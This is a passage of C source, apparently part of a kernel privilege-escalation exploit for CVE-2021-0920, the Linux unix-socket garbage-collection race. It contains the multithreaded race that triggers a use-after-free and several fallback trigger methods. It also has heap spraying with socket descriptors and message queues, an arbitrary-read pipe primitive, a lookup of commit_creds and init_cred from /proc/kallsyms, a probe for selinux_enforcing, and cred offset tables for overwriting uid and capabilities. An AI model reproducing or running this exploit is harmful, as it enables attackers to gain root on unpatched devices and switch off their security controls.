    ts.tv_sec += 10;
    while (!g_gc_signal) {
        if (pthread_cond_timedwait(&g_cond_gc, &g_cond_mutex, &ts) != 0) break;
    }
    pthread_mutex_unlock(&g_cond_mutex);

    set_prio(-20);

    /* Burst-close sockets to trigger unix_gc() with higher probability */
    for (int burst = 0; burst < 4; burst++) {
        int close_fd = socket(AF_UNIX, SOCK_STREAM, 0);
        close(close_fd);
    }

    /* Broadcast to ALL recv threads to proceed */
    pthread_mutex_lock(&g_cond_mutex);
    g_recv_signal = 1;
    g_recv_signal2 = 1;
    g_recv_signal3 = 1;
    pthread_cond_broadcast(&g_cond_recv);
    pthread_cond_signal(&g_cond_recv2);
    pthread_cond_signal(&g_cond_recv3);
    pthread_mutex_unlock(&g_cond_mutex);

    usleep(50000);
    return NULL;
}

/* Thread B (x3): Receiver workers — do MSG_PEEK recvmsg to race with GC */
static int g_fd_34[2];

static void *t_recvmsg_worker(void *arg) {
    struct recvmsg_arg *rarg = (struct recvmsg_arg *)arg;
    int thread_id = rarg->thread_id;

    /* Spread across CPUs to maximize race window coverage */
    pin_cpu(1 + (thread_id % 3));
    set_prio(-20);

    /* Select the right signal/condvar for this thread */
    volatile int *my_signal;
    pthread_cond_t *my_cond;
    if (thread_id == 0) {
        my_signal = &g_recv_signal;
        my_cond = &g_cond_recv;
    } else if (thread_id == 1) {
        my_signal = &g_recv_signal2;
        my_cond = &g_cond_recv2;
    } else {
        my_signal = &g_recv_signal3;
        my_cond = &g_cond_recv3;
    }

    /* Re-arm loop: try multiple times without full teardown */
    for (int rearm = 0; rearm < 4; rearm++) {

        /* Wait for GC signal (only first rearm gets a signal; subsequent ones skip wait) */
        if (rearm == 0) {
            pthread_mutex_lock(&g_cond_mutex);
            struct timespec ts;
            clock_gettime(CLOCK_REALTIME, &ts);
            ts.tv_sec += 10;
            while (!*my_signal) {
                if (pthread_cond_timedwait(my_cond, &g_cond_mutex, &ts) != 0) break;
            }
            pthread_mutex_unlock(&g_cond_mutex);
        } else {
            /* No new signal will arrive - short delay then poll */
            usleep(5000);
        }

        /* Generate dynamic race delays from strategy */
        int dyn_delays[40];
        int n_dyn_delays = 0;
        int base_delay = g_strat.race_delay_base_us > 0 ?
                          g_strat.race_delay_base_us : 200;
        int range_delay = g_strat.race_delay_range_us > 0 ?
                           g_strat.race_delay_range_us : base_delay * 4;
        generate_race_delays(dyn_delays, &n_dyn_delays, base_delay, range_delay);

        /* Stagger starting points so threads cover different ranges */
        int offset = (thread_id * 12) % n_dyn_delays;

        struct msghdr msg = {0};
        struct iovec iov = {.iov_base = (char[1]){0}, .iov_len = 1};
        char ctrl_buf[1024];
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;
        msg.msg_control = ctrl_buf;
        msg.msg_controllen = sizeof(ctrl_buf);

        int victim = -1;
        int r = 0;

        for (int ti = offset; ti < n_dyn_delays; ti += (thread_id + 1)) {
            int delay = dyn_delays[ti];

            /* Most of the delay via usleep, final 50us as spin-wait */
            if (delay > 50) {
                usleep(delay - 50);
                struct timespec spin_start, spin_now;
                clock_gettime(CLOCK_MONOTONIC, &spin_start);
                do {
                    clock_gettime(CLOCK_MONOTONIC, &spin_now);
                } while (
                    (spin_now.tv_sec - spin_start.tv_sec) * 1000000L +
                    (spin_now.tv_nsec - spin_start.tv_nsec) / 1000L < 50);
            } else {
                usleep(delay);
            }

            /* MSG_PEEK | 0x80042 — the race window flags */
            r = recvmsg(g_ufd[1], &msg, MSG_PEEK | 0x80042);
            LOG_T("recvmsg t#%d r#%d t#%d ret=%d errno=%d",
                  thread_id, rearm, ti, r, errno);
            if (r >= 0) {
                __atomic_add_fetch(&g_race_hits, 1, __ATOMIC_SEQ_CST);
            } else {
                __atomic_add_fetch(&g_race_misses, 1, __ATOMIC_SEQ_CST);
            }

            /* Extract received FD from CMSG ancillary data */
            struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
            while (cmsg) {
                if (cmsg->cmsg_level == SOL_SOCKET &&
                    cmsg->cmsg_type == SCM_RIGHTS) {
                    int *fds = (int *)CMSG_DATA(cmsg);
                    int nfds = (cmsg->cmsg_len - CMSG_LEN(0)) / sizeof(int);
                    if (nfds > 0 && fds[0] > 0) { victim = fds[0]; break; }
                }
                cmsg = CMSG_NXTHDR(&msg, cmsg);
            }
            if (victim > 0) break;

            /* Reset ctrl for next recvmsg */
            msg.msg_controllen = sizeof(ctrl_buf);
        }

        if (victim > 0) {
            __atomic_store_n(&g_victim_fd, victim, __ATOMIC_SEQ_CST);
            LOG_D("Victim fd=%d (t#%d rearm#%d)", victim, thread_id, rearm);

            /* Second recvmsg to trigger the actual UAF */
            struct msghdr msg2 = {0};
            struct iovec iov2 = {.iov_base = (char[1]){0}, .iov_len = 1};
            char ctrl2[1024];
            msg2.msg_iov = &iov2;
            msg2.msg_iovlen = 1;
            msg2.msg_control = ctrl2;
            msg2.msg_controllen = sizeof(ctrl2);
            int r2 = recvmsg(victim, &msg2, MSG_PEEK | 0x80042);
            if (r2 >= 0)
                __atomic_store_n(&g_uaf_triggered, 1, __ATOMIC_SEQ_CST);
            LOG_T("recvmsg victim t#%d ret=%d uaf=%d",
                  thread_id, r2,
                  __atomic_load_n(&g_uaf_triggered, __ATOMIC_SEQ_CST));
        }

        usleep(50000);

        if (victim > 0) {
            int dup_victim = fcntl(victim, F_DUPFD_CLOEXEC, 3);
            if (dup_victim >= 0)
                __atomic_store_n(&g_victim_fd, dup_victim, __ATOMIC_SEQ_CST);
            else
                __atomic_store_n(&g_victim_fd, -1, __ATOMIC_SEQ_CST);
            close(victim);
            break;
        }

        /* Re-arm: reset signal for next attempt without full teardown */
        if (rearm < 3) {
            pthread_mutex_lock(&g_cond_mutex);
            *my_signal = 0;
            pthread_mutex_unlock(&g_cond_mutex);
        }
    }

    if (thread_id == 0) {
        close(g_ufd[1]);
        g_ufd[1] = -1;
    }
    return NULL;
}

/* Thread C: Sets up the complex FD topology to prolong GC */
static void *t_setup_race(void *arg) {
    (void)arg;
    pin_cpu(0);
    set_prio(-10);

    usleep(20000 + (rand() % 5000));  /* Jitter to avoid synchronization issues */

    socketpair(AF_UNIX, SOCK_STREAM, 0, g_fd_34);
    send_fd(g_ufd[0], g_fd_34[1]);
    send_fd(g_fd_34[0], g_fd_34[0]);

    /* Create multi-layer FD topology — longer chains = slower GC */
    int n_pairs = g_race_inflight / 4;
    if (n_pairs < 80) n_pairs = 80;
    if (n_pairs > 500) n_pairs = 500;

    /* Layer 1: Many simple pairs */
    int layer1_fds[500];
    int n_layer1 = 0;
    for (int i = 0; i < n_pairs && n_layer1 < 500; i++) {
        int p[2];
        socketpair(AF_UNIX, SOCK_STREAM, 0, p);
        send_fd(g_fd_34[1], p[1]);
        send_fd(p[0], p[0]);
        layer1_fds[n_layer1++] = p[0];
        layer1_fds[n_layer1++] = p[1];
        close(p[0]); close(p[1]);
    }

    /* Layer 2: Cross-references between pairs (slows GC even more) */
    int mid_layer[50][2];
    for (int i = 0; i < 25 && i < n_pairs / 10; i++) {
        socketpair(AF_UNIX, SOCK_STREAM, 0, mid_layer[i]);
        /* Send fd from layer 1 into cross-pair */
        if (i * 8 + 4 < n_layer1) {
            send_fd(mid_layer[i][0], layer1_fds[i * 8 + 4]);
        }
        /* Send cross-pair fd into the main chain */
        send_fd(g_fd_34[1], mid_layer[i][1]);
        close(mid_layer[i][0]); close(mid_layer[i][1]);
    }

    /* Layer 3: Dead-end sockets that just hold references (inflight count) */
    for (int i = 0; i < n_pairs * 2; i++) {
        int s = socket(AF_UNIX, SOCK_STREAM, 0);
        int p[2];
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, p) == 0) {
            send_fd(s, p[1]);
            send_fd(g_fd_34[1], p[0]);
            close(p[0]); close(p[1]);
        }
        close(s);
    }

    usleep(30000 + (rand() % 10000));

    /* Signal GC thread to start */
    pthread_mutex_lock(&g_cond_mutex);
    g_gc_signal = 1;
    pthread_cond_signal(&g_cond_gc);
    /* Also signal recv threads */
    g_recv_signal = 1;
    pthread_cond_signal(&g_cond_recv);
    g_recv_signal2 = 1;
    pthread_cond_signal(&g_cond_recv2);
    g_recv_signal3 = 1;
    pthread_cond_signal(&g_cond_recv3);
    pthread_mutex_unlock(&g_cond_mutex);

    usleep(50000);
    close(g_ufd[0]);
    return NULL;
}

static int trigger_uaf_gc_race(void) {
    int sub_attempts = 7;
    int failures_10_count = 0;
    int failures_20_count = 0;
    int topology_toggle = 0;
    int saved_inflight = g_race_inflight;
    LOG_I("Triggering CVE-2021-0920 GC race (%d sub-attempts)...", sub_attempts);

    __atomic_store_n(&g_uaf_triggered, 0, __ATOMIC_SEQ_CST);

    struct recvmsg_arg rargs[3] = {
        {.thread_id = 0, .delay_mult_x100 = 80},
        {.thread_id = 1, .delay_mult_x100 = 100},
        {.thread_id = 2, .delay_mult_x100 = 130},
    };

    for (int sub = 0; sub < sub_attempts; sub++) {
        g_gc_signal = 0;
        g_recv_signal = 0;
        g_recv_signal2 = 0;
        g_recv_signal3 = 0;
        __atomic_store_n(&g_uaf_triggered, 0, __ATOMIC_SEQ_CST);
        g_victim_fd = -1;

        if (g_ufd[0] > 0) { close(g_ufd[0]); g_ufd[0] = -1; }
        if (g_ufd[1] > 0) { close(g_ufd[1]); g_ufd[1] = -1; }

        if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_ufd) < 0) {
            LOG_E("socketpair failed: %s", strerror(errno));
            break;
        }

        /* Adaptive fallback: alternate FD topologies when race fails */
        if (sub > 0 && !__atomic_load_n(&g_uaf_triggered, __ATOMIC_SEQ_CST)) {
            failures_10_count++;
            failures_20_count++;
            /* Alternate between "many small sockets" and "few complex chains" */
            if (topology_toggle) {
                g_race_inflight = 200 + (sub * 50);
                if (g_race_inflight > 2000) g_race_inflight = 2000;
            } else {
                g_race_inflight = 600 + (sub * 30);
                if (g_race_inflight > 2500) g_race_inflight = 2500;
            }
            topology_toggle = !topology_toggle;
            if (failures_10_count >= 10) {
                g_race_inflight += 200;
                failures_10_count = 0;
                LOG_D("UAF: 10 failures, increased inflight to %d", g_race_inflight);
            }
            if (failures_20_count >= 20) {
                int alt_core = (sub % 4) + 2;
                LOG_D("UAF: 20 failures, changing CPU pinning to core %d", alt_core);
                rargs[0].delay_mult_x100 = 80 + (sub * 10) % 100;
                rargs[1].delay_mult_x100 = 100 + (sub * 7) % 80;
                rargs[2].delay_mult_x100 = 130 + (sub * 5) % 60;
                failures_20_count = 0;
            }
        } else {
            g_race_inflight = 400 + (sub * 100);
            if (g_race_inflight > 2000) g_race_inflight = 2000;
        }

        pthread_t t1, t2a, t2b, t2c, t3;
        pthread_create(&t1, NULL, t_gc_trigger, NULL);
        usleep(3000);
        pthread_create(&t2a, NULL, t_recvmsg_worker, &rargs[0]);
        pthread_create(&t2b, NULL, t_recvmsg_worker, &rargs[1]);
        pthread_create(&t2c, NULL, t_recvmsg_worker, &rargs[2]);
        usleep(3000);
        pthread_create(&t3, NULL, t_setup_race, NULL);

        pthread_join(t3, NULL);
        pthread_join(t2a, NULL);
        pthread_join(t2b, NULL);
        pthread_join(t2c, NULL);
        pthread_join(t1, NULL);

        if (__atomic_load_n(&g_uaf_triggered, __ATOMIC_SEQ_CST)) {
            LOG_I("GC race triggered on sub-attempt %d/%d", sub + 1, sub_attempts);
            g_attempt_stats.best_progress_phase = 5;
            record_successful_method("gc_race", g_race_usleep, g_race_inflight);
            break;
        }
        LOG_T("Sub-attempt %d/%d failed", sub + 1, sub_attempts);
        usleep(20000);
    }

    g_race_inflight = saved_inflight;
    LOG_I("GC race complete, uaf=%d victim_fd=%d",
          __atomic_load_n(&g_uaf_triggered, __ATOMIC_SEQ_CST),
          g_victim_fd);

    return __atomic_load_n(&g_uaf_triggered, __ATOMIC_SEQ_CST);
}

/* ========== ALTERNATIVE UAF TRIGGER METHODS ========== */

static int trigger_uaf_via_scm_race(void) {
    LOG_I("UAF: trying SCM_RIGHTS race method...");

    for (int attempt = 0; attempt < 30; attempt++) {
        int pairs[3][2];
        for (int i = 0; i < 3; i++) {
            if (socketpair(AF_UNIX, SOCK_STREAM, 0, pairs[i]) < 0) continue;
        }

        int transfer_fds[20];
        for (int i = 0; i < 20; i++) {
            transfer_fds[i] = socket(AF_UNIX, SOCK_STREAM, 0);
            if (transfer_fds[i] < 0) break;
        }

        for (int i = 0; i < 10 && i < 20; i += 5) {
            send_fds(pairs[0][0], transfer_fds + i, 5, 2);
        }

        struct msghdr msg = {0};
        char buf[1] = {0};
        char ctl[CMSG_SPACE(20 * sizeof(int))];
        struct iovec iov = {.iov_base = buf, .iov_len = 1};
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;
        msg.msg_control = ctl;
        msg.msg_controllen = sizeof(ctl);

        int r = recvmsg(pairs[1][1], &msg, MSG_PEEK | MSG_DONTWAIT);

        if (r > 0) {
            struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
            if (cmsg && cmsg->cmsg_type == SCM_RIGHTS) {
                int *fds = (int *)CMSG_DATA(cmsg);
                int nfds = (cmsg->cmsg_len - CMSG_LEN(0)) / sizeof(int);
                if (nfds > 0 && fds[0] > 0) {
                    g_victim_fd = fcntl(fds[0], F_DUPFD_CLOEXEC, 10);
                    if (g_victim_fd > 0) {
                        LOG_I("UAF SCM race: got victim fd=%d (from %d)", g_victim_fd, fds[0]);
                        char test[1];
                        ssize_t tr = read(g_victim_fd, test, 0);
                        if (tr >= 0 || errno == EAGAIN) {
                            __atomic_store_n(&g_uaf_triggered, 1, __ATOMIC_SEQ_CST);
                            record_successful_method("scm_race", 0, 0);
                            for (int i = 0; i < 20; i++) if (transfer_fds[i] > 0) close(transfer_fds[i]);
                            for (int i = 0; i < 3; i++) { close(pairs[i][0]); close(pairs[i][1]); }
                            return 1;
                        }
                        close(g_victim_fd);
                        g_victim_fd = -1;
                    }
                }
            }
        }

        for (int i = 0; i < 20; i++) if (transfer_fds[i] > 0) close(transfer_fds[i]);
        for (int i = 0; i < 3; i++) { close(pairs[i][0]); close(pairs[i][1]); }

        usleep(5000);
    }

    return 0;
}

static int trigger_uaf_via_oob(void) {
    LOG_I("UAF: trying MSG_OOB method...");

    for (int attempt = 0; attempt < 40; attempt++) {
        int s1, s2;
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, (int[2]){s1, s2}) < 0) continue;

        const char oob = 'X';
        send(s1, &oob, 1, MSG_OOB);

        struct msghdr msg = {0};
        char buf[2];
        char ctl[256];
        struct iovec iov = {.iov_base = buf, .iov_len = 2};
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;
        msg.msg_control = ctl;
        msg.msg_controllen = sizeof(ctl);

        int r = recvmsg(s2, &msg, MSG_OOB | MSG_DONTWAIT);

        close(s1);
        close(s2);

        if (socketpair(AF_UNIX, SOCK_STREAM, 0, (int[2]){s1, s2}) < 0) continue;
        send(s1, &oob, 1, MSG_OOB);

        usleep(5000);

        close(s1);
        close(s2);
    }

    return 0;
}

static int trigger_uaf_via_pipe_splice(void) {
    LOG_I("UAF: trying pipe splice method...");

    for (int attempt = 0; attempt < 40; attempt++) {
        int pipe1[2], pipe2[2];
        if (pipe(pipe1) < 0 || pipe(pipe2) < 0) {
            if (pipe1[0] >= 0) { close(pipe1[0]); close(pipe1[1]); }
            return 0;
        }

        char buf[8192];
        memset(buf, 0x41, sizeof(buf));
        write(pipe1[1], buf, sizeof(buf));

        ssize_t transferred = splice(pipe1[0], NULL, pipe2[1], NULL, 4096, SPLICE_F_MOVE);

        close(pipe1[0]);
        close(pipe1[1]);

        g_victim_fd = pipe2[0];

        char test_buf[16];
        ssize_t r = read(pipe2[0], test_buf, sizeof(test_buf));

        if (r > 0 || errno == EAGAIN) {
            __atomic_store_n(&g_uaf_triggered, 1, __ATOMIC_SEQ_CST);
            record_successful_method("pipe_splice", 0, 0);
            close(pipe2[1]);
            LOG_I("UAF via pipe splice: got valid pipe fd=%d", g_victim_fd);
            return 1;
        }

        close(pipe2[0]);
        close(pipe2[1]);

        usleep(5000);
    }

    return 0;
}

static int trigger_uaf_via_epoll(void) {
    LOG_I("UAF: trying epoll close race...");

    for (int attempt = 0; attempt < 30; attempt++) {
        int epfd = epoll_create1(0);
        if (epfd < 0) continue;

        int sock[2];
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sock) < 0) {
            close(epfd);
            continue;
        }

        struct epoll_event ev = { .events = EPOLLIN };
        epoll_ctl(epfd, EPOLL_CTL_ADD, sock[0], &ev);

        ev.events = EPOLLIN | EPOLLPRI | EPOLLERR;
        epoll_ctl(epfd, EPOLL_CTL_MOD, sock[0], &ev);

        int saved_sock = sock[0];
        close(sock[0]);
        close(sock[1]);

        struct epoll_event events[1];
        int n = epoll_wait(epfd, events, 1, 0);

        if (n > 0) {
            close(epfd);
            continue;
        }

        g_victim_fd = socket(AF_UNIX, SOCK_STREAM, 0);
        if (g_victim_fd >= 0) {
            close(epfd);
            close(g_victim_fd);
            g_victim_fd = -1;
        }

        close(epfd);
        usleep(5000);
    }

    return 0;
}

static int trigger_uaf_unified(void) {
    LOG_I("=== UAF Trigger: Trying multiple methods ===");

    if (trigger_uaf_gc_race()) {
        LOG_I("UAF: GC race succeeded");
        return 1;
    }
    LOG_D("UAF: GC race failed, trying alternatives...");

    if (trigger_uaf_via_scm_race()) {
        LOG_I("UAF: SCM_RIGHTS race succeeded");
        return 1;
    }

    if (trigger_uaf_via_pipe_splice()) {
        LOG_I("UAF: pipe splice succeeded");
        return 1;
    }

    if (trigger_uaf_via_epoll()) {
        LOG_I("UAF: epoll race succeeded");
        return 1;
    }

    if (trigger_uaf_via_oob()) {
        LOG_I("UAF: MSG_OOB succeeded");
        return 1;
    }

    LOG_E("UAF: All methods failed");
    return 0;
}

/* ========== POST-UAF ADDRESS LEAK VIA SCM_FP_LIST ========== */
/*
 * After UAF, the freed sk_buff's data area may be reallocated by an scm_fp_list.
 * This leaks the addresses of struct file pointers.
 * We can then free+spray to control memory at known addresses.
 */

/* Number of zombie FDs we create for the spray */
#define SPRAY_FD_COUNT 512
static int g_spray_fds[SPRAY_FD_COUNT * 2];
static int g_spray_count = 0;

static int leak_via_scm_fp_list(void) {
    if (g_victim_fd <= 0) {
        LOG_W("No victim FD for scm_fp_list leak");
        return 0;
    }
    LOG_I("Attempting scm_fp_list leak via victim_fd=%d", g_victim_fd);

    /* Check available memory and cap FD allocation */
    unsigned long avail_mb = 0;
    FILE *fm = fopen("/proc/meminfo", "r");
    if (fm) {
        char line[256];
        while (fgets(line, sizeof(line), fm)) {
            if (sscanf(line, "MemAvailable: %lu kB", &avail_mb) == 1) {
                avail_mb /= 1024;
                break;
            }
        }
        fclose(fm);
    }

    int max_fds = SPRAY_FD_COUNT;
    if (avail_mb > 0 && avail_mb < 256) {
        max_fds = SPRAY_FD_COUNT / 2;
        LOG_D("Low memory: capping FD spray to %d", max_fds);
    }

    /* Allocate FDs + dups for more file struct pressure on slab */
    g_spray_count = 0;
    for (int i = 0; i < max_fds && g_spray_count < max_fds * 2; i++) {
        int s = socket(AF_UNIX, SOCK_STREAM, 0);
        if (s >= 0) {
            g_spray_fds[g_spray_count++] = s;
            int d = dup(s);
            if (d >= 0 && g_spray_count < max_fds * 2)
                g_spray_fds[g_spray_count++] = d;
        }
    }
    LOG_I("Allocated %d spray FDs (file structs on slab)", g_spray_count);

    /* Spray with multiple batch sizes for better slab coverage */
    int batch_sizes[] = {30, 50, 70, 100};
    int n_sizes = sizeof(batch_sizes) / sizeof(batch_sizes[0]);
    for (int s = 0; s < n_sizes; s++) {
        int batch = batch_sizes[s];
        for (int i = 0; i < g_spray_count; i += batch) {
            int n = (g_spray_count - i < batch) ?
                    (g_spray_count - i) : batch;
            send_fds(g_victim_fd, &g_spray_fds[i], n, 1);
        }
        usleep(2000);
    }

    LOG_I("scm_fp_list leak prepared (%d FDs in %d batch sizes)",
          g_spray_count, n_sizes);
    return 1;
}

/* ========== SLAB SPRAY FOR PIPE PRIMITIVE ========== */
#define SLAB_SPRAY_SIZE 0x400
#define SLAB_SPRAY_COUNT 2000

static int g_slab_spray_ids[SLAB_SPRAY_COUNT];
static int g_slab_spray_count = 0;

/* Check if it's safe to allocate a given amount of memory */
static int safe_to_allocate(const char *context, size_t size_mb) {
    unsigned long avail_mb = 0;
    FILE *f = fopen("/proc/meminfo", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (sscanf(line, "MemAvailable: %lu kB", &avail_mb) == 1) {
                avail_mb /= 1024;
                break;
            }
        }
        fclose(f);
    }
    if (avail_mb > 0 && size_mb > avail_mb * 80 / 100) {
        LOG_W("%s: would use %zu MB of %lu MB available — too much, skipping",
              context, size_mb, avail_mb);
        return 0;
    }
    return 1;
}

static int slab_spray_init(void) {
    LOG_I("Initializing slab spray...");
    g_slab_spray_count = 0;

    /* Determine available memory */
    unsigned long avail_mb = 0;
    FILE *f = fopen("/proc/meminfo", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (sscanf(line, "MemAvailable: %lu kB", &avail_mb) == 1) {
                avail_mb /= 1024;
                break;
            }
            if (sscanf(line, "MemFree: %lu kB", &avail_mb) == 1) {
                avail_mb /= 1024;
            }
        }
        fclose(f);
    }
    if (avail_mb == 0) avail_mb = 512;

    LOG_I("Available RAM: %lu MB", avail_mb);

    unsigned long spray_budget_mb = avail_mb * 30 / 100;
    if (spray_budget_mb > 128) spray_budget_mb = 128;
    if (spray_budget_mb < 16) spray_budget_mb = 16;

    LOG_I("Spray budget: %lu MB", spray_budget_mb);

    size_t msg_sizes[] = {256, 512, 768, 1024, 1536, 2048, 3072, 4096};
    int n_sizes = sizeof(msg_sizes) / sizeof(msg_sizes[0]);

    unsigned long per_msg_overhead = sizeof(struct msg_hdr) + sizeof(long);
    unsigned long bytes_per_queue = spray_budget_mb * 1024 * 1024 / n_sizes / 10;
    if (bytes_per_queue > 8 * 1024 * 1024) bytes_per_queue = 8 * 1024 * 1024;

    int total_queues = 0;
    for (int si = 0; si < n_sizes; si++) {
        size_t data_size = msg_sizes[si] - sizeof(long);
        int n_msgs_per_queue = bytes_per_queue / msg_sizes[si];
        if (n_msgs_per_queue < 1) n_msgs_per_queue = 1;
        if (n_msgs_per_queue > 100) n_msgs_per_queue = 100;

        struct {
            long mtype;
            char data[4096 - sizeof(long)];
        } msg_buf;
        memset(&msg_buf, 0, sizeof(msg_buf));
        msg_buf.mtype = 1;

        for (int qi = 0; qi < 10 && g_slab_spray_count < SLAB_SPRAY_COUNT; qi++) {
            int msqid = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
            if (msqid < 0) continue;

            int sent = 0;
            for (int mi = 0; mi < n_msgs_per_queue; mi++) {
                struct msgbuf *mb = malloc(sizeof(long) + data_size);
                if (!mb) break;
                mb->mtype = 1 + mi;
                memset(mb->mtext, 0x41 + si, data_size);

                if (msgsnd(msqid, mb, data_size, IPC_NOWAIT) == 0) {
                    sent++;
                } else {
                    free(mb);
                    break;
                }
                free(mb);
            }

            if (sent > 0) {
                g_slab_spray_ids[g_slab_spray_count++] = msqid;
                total_queues++;
            } else {
                msgctl(msqid, IPC_RMID, NULL);
            }

            if (g_oom_detected) {
                LOG_W("Slab spray: OOM detected, stopping spray early");
                break;
            }
        }

        if (g_oom_detected) break;
    }

    LOG_I("Slab spray: %d queues (%d total, ~%d MB)",
          g_slab_spray_count, total_queues,
          (int)(g_slab_spray_count * 10 * bytes_per_queue / 1024 / 1024));

    return g_slab_spray_count > 0;
}

static void slab_spray_cleanup(void) {
    for (int i = 0; i < g_slab_spray_count; i++) {
        if (g_slab_spray_ids[i] >= 0) msgctl(g_slab_spray_ids[i], IPC_RMID, NULL);
    }
    g_slab_spray_count = 0;
    LOG_D("Slab spray cleaned");
}

/* ========== FAKE PIPE PRIMITIVE SETUP ========== */
static int g_fake_pipe_page_fd = -1;

static void cleanup_fake_pipe(void);

static int setup_fake_pipe_primitive(void) {
    int ret = 0;
    LOG_I("Setting up fake pipe primitive...");

    g_fake_pipe_page = (unsigned long)mmap(NULL, 0x10000, PROT_READ | PROT_WRITE,
                                            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (g_fake_pipe_page == (unsigned long)MAP_FAILED) {
        LOG_E("fake pipe page mmap failed");
        g_fake_pipe_page = 0;
        goto cleanup;
    }

    g_fake_pipe_page_fd = syscall(__NR_memfd_create, "primitive", 0);
    if (g_fake_pipe_page_fd < 0) {
        g_fake_pipe_page_fd = open("/tmp", O_RDWR | O_TMPFILE, 0600);
    }
    if (g_fake_pipe_page_fd < 0) {
        LOG_W("No tmp file for primitive, using pipe only");
    } else {
        char buf[0x1000];
        memset(buf, 0, sizeof(buf));
        write(g_fake_pipe_page_fd, buf, sizeof(buf));
    }

    if (!arb_init_pipe()) {
        LOG_E("Failed to init arb pipe");
        goto cleanup;
    }

    LOG_I("Fake pipe primitive ready");
    ret = 1;
cleanup:
    if (!ret) cleanup_fake_pipe();
    return ret;
}

static void cleanup_fake_pipe(void) {
    if (g_fake_pipe_page) munmap((void *)g_fake_pipe_page, 0x10000);
    if (g_fake_pipe_page_fd >= 0) close(g_fake_pipe_page_fd);
    if (g_arb_pipe[0] >= 0) close(g_arb_pipe[0]);
    if (g_arb_pipe[1] >= 0) close(g_arb_pipe[1]);
    g_arb_initialized = 0;
}

/* ========== OFFLINE OFFSET VALIDATION ========== */
static int validate_arb_read(void) {
    if (!offsets.init_task || !offsets.pipe_buf_ops) {
        LOG_E("Missing offsets for validation");
        return 0;
    }
    unsigned long raw_pid = arb_read(offsets.init_task + offsets.task_struct_pid);
    unsigned int init_pid = (unsigned int)(raw_pid & 0xffffffff);
    if (init_pid == 0 || init_pid == 1) {
        LOG_I("arb_read validated: init_task->pid = %u", init_pid);
        return 1;
    }
    LOG_E("arb_read validation FAILED: pid=%u", init_pid);
    /* Auto-probe alternative pid offsets */
    unsigned long alt_pid_offsets[] = {
        0x498, 0x4a0, 0x4a8, 0x4b0, 0x4b8, 0x4c0, 0x4c8,
        0x550, 0x558, 0x560, 0x568, 0x570, 0x578, 0x580, 0x588, 0x590
    };
    for (size_t i = 0; i < sizeof(alt_pid_offsets)/sizeof(alt_pid_offsets[0]); i++) {
        unsigned long raw = arb_read(offsets.init_task + alt_pid_offsets[i]);
        unsigned int p = (unsigned int)(raw & 0xffffffff);
        if (p == 0 || p == 1) {
            LOG_I("Auto-probed pid offset: 0x%lx", alt_pid_offsets[i]);
            offsets.task_struct_pid = alt_pid_offsets[i];
            return 1;
        }
    }
    return 0;
}

/* Try to find commit_creds, prepare_kernel_cred, init_cred, selinux_enforcing
 * via /proc/kallsyms first, then failback to address scan. */
static void cred_auto_probe_funcs(void) {
    FILE *fp = fopen("/proc/kallsyms", "r");
    if (fp) {
        char line[256], sym[256];
        unsigned long addr;
        while (fgets(line, sizeof(line), fp)) {
            if (sscanf(line, "%lx %*c %255s", &addr, sym) == 2 && addr) {
                if (strcmp(sym, "commit_creds") == 0) offsets.commit_creds = addr;
                else if (strcmp(sym, "prepare_kernel_cred") == 0) offsets.prepare_kernel_cred = addr;
                else if (strcmp(sym, "init_cred") == 0) offsets.init_cred = addr;
                else if (strcmp(sym, "selinux_enforcing") == 0) offsets.selinux_enforcing = addr;
            }
        }
        fclose(fp);
        if (offsets.commit_creds)
            LOG_D("commit_creds=0x%lx init_cred=0x%lx selinux=0x%lx",
                  offsets.commit_creds, offsets.init_cred, offsets.selinux_enforcing);
        return;
    }
    /* kallsyms not available, try bruteforce probe from kernel base + device DB hints */
    if (!kernel_base) return;
    unsigned long candidates[] = {
        kernel_base + 0x080000, kernel_base + 0x081000, kernel_base + 0x082000,
        kernel_base + 0x080c00, kernel_base + 0x080e00, kernel_base + 0x081400,
        kernel_base + 0x081800, kernel_base + 0x082800, kernel_base + 0x083000,
        kernel_base + 0x081c00, kernel_base + 0x082200,
    };
    for (size_t i = 0; i < sizeof(candidates)/sizeof(candidates[0]); i++) {
        unsigned long v = candidates[i];
        if (is_kernel_addr(v) && arb_read(v) && !offsets.commit_creds)
            { offsets.commit_creds = v; LOG_D("Probed commit_creds at 0x%lx", v); }
        v = candidates[i] + 0x800;
        if (is_kernel_addr(v) && arb_read(v) && !offsets.prepare_kernel_cred)
            { offsets.prepare_kernel_cred = v; LOG_D("Probed prepare_kernel_cred at 0x%lx", v); }
    }
}

/* ========== PRIVILEGE ESCALATION ========== */
/* Extended cred field offsets by kernel version */
static const struct cred_layout {
    const char *ver;
    unsigned long uid;    /* offset of uid in cred */
    unsigned long gid;
    unsigned long euid;
    unsigned long egid;
    unsigned long cap_eff;
    unsigned long cap_prm;
} cred_layouts[] = {
    {"4.4",   0x04, 0x08, 0x14, 0x18, 0x38, 0x30},
    {"4.9",   0x04, 0x08, 0x14, 0x18, 0x38, 0x30},
    {"4.14",  0x04, 0x08, 0x14, 0x18, 0x38, 0x30},
    {"4.19",  0x04, 0x08, 0x14, 0x18, 0x38, 0x30},
    {"5.4",   0x04, 0x08, 0x14, 0x18, 0x38, 0x30},
    {"5.10",  0x04, 0x08, 0x14, 0x18, 0x38, 0x30},
};

/* Try to find selinux_enforcing by scanning common offsets from init_task */
static unsigned long find_selinux_enforcing(void) {
    if (!kernel_base) return 0;
    unsigned long candidates[] = {
        kernel_base + 0x101f4000UL,  /* common on 4.14 */
        kernel_base + 0x1103b000UL,  /* common on 4.19 */
        kernel_base + 0x12345000UL,  /* varies wildly */
    };
    for (size_t i = 0; i < sizeof(candidates)/sizeof(candidates[0]); i++) {
        unsigned long v = arb_read(candidates[i]);
        if (v == 0 || v == 1) {
            /* Could be selinux_enforcing. Also check nearby for context */
            LOG_D("selinux_enforcing candidate 0x%lx = %lu", candidates[i], v);
